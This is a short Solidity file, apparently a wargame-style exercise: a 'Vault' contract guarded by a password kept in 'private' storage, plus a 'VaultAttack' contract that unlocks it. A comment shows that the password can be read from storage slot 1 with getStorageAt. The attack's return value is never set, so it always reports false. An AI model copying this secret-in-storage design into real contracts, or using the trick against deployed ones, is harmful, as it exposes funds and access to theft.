pragma solidity ^0.4.24;


contract Vault {
  bool public locked;
  bytes32 private password;

  function Vault(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}


contract VaultAttack {

    Vault victim;

    constructor(address _victim) public {
        victim = Vault(_victim);
    }

    //victim's password can be read from storage through  web3.eth.getStorageAt(contractAddr, 1)
    function attack(bytes32 _password) external returns(bool success) {
        victim.unlock(_password);
        return success;
    }
}
